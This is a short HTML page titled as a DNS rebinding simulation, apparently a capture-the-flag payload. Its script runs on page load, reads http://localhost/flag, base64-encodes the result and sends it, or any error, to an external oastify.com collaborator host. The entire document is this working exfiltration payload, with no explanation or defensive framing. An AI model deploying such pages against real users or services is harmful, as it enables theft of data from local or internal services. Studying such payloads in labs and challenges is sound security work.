<!DOCTYPE html>
<html>
<head>
    <title>DNS Rebinding Simulation</title>
</head>
<body>
<script>
setTimeout(() => {
    fetch('http://localhost/flag')
        .then(r => r.text())
        .then(flag => {
            // Use HTTPS for the callback
            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag=' + btoa(flag))
                .then(() => {
                    document.body.innerHTML = '<h1>Flag submitted!</h1>';
                });
        })
        .catch(err => {
            // Use HTTPS for the callback
            fetch('https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error=' + btoa(err.toString()))
                .then(() => {
                    document.body.innerHTML = '<h1>Error submitted!</h1>';
                });
        });
}, 2000);
</script>
</body>
</html>
